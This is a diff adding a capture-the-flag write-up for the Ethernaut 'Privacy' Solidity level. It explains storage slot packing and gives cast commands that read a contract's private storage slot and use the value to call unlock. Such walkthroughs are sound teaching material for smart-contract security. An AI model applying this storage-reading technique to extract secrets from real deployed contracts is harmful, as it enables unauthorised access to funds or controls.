@@ -421,3 +421,36 @@ contract FakeBuilding {
 }
 ```
 
+---
+
+# 12: Privacy
+**Level Link:** [Privacy Challenge](https://ethernaut.openzeppelin.com/level/12)  
+**Bug:** Private variable storage access using slots  
+**Objective:** Unlock the contract by reading private storage
+
+**Vulnerability Analysis:**  
+The contract stores sensitive data in private variables, but all contract storage is publicly readable. We exploit this by reading the data[2]. But how can I read ? Solidity stores the data in the order they declared. Starting from the first, it collects the variables which are combinedly under 32 bytes and store it in storage[0] then again starts reading variables and collects which are under 32 bytes and have it in storage[1] goes like this.
+In our case 
+```solidity
+bool public locked = true;  // bool needs 1byte -> Goes to storage[0]
+uint256 public ID = block.timestamp; // uint256 needs 32Bytes -> Even though we have 31bytes left on first slot it can't accomodate 32bytes so it will goes to slot[1]
+uint8 private flattening = 10; // uint8 needs 1Byte -> goes to slot[2]
+uint8 private denomination = 255; // uint8 needs 1Byte -> goes to slot[2]
+uint16 private awkwardness = uint16(block.timestamp); // uint16 needs 2Bytes -> goes to slot[2]
+bytes32[3] private data; // bytes32[3] needs 32Bytes for each one. data[0] -> slot[3] , data[1] -> slot[4], data[2] -> slot[5] 
+```
+
+**Attack Steps:**
+1. Reading `data[2]` from Slot 5 (storage is sequential)
+   ```bash
+   DATA=$(cast storage $CONTRACT_ADDR 5 --rpc-url $RPC_URL)
+   ```
+2. Take first 16 bytes (e.g., 0x1234... → 0x1234)
+    ```
+   # Extract first 16 bytes (remove '0x' + first 32 chars)
+   BYTES16_KEY="0x${DATA:2:32}"
+   ```
+3. Call unlock(bytes16(key))
+    ```bash
+   cast send $CONTRACT_ADDR "unlock(bytes16)" $BYTES16_KEY --private-key $PK --rpc-url $RPC_URL
+    ```
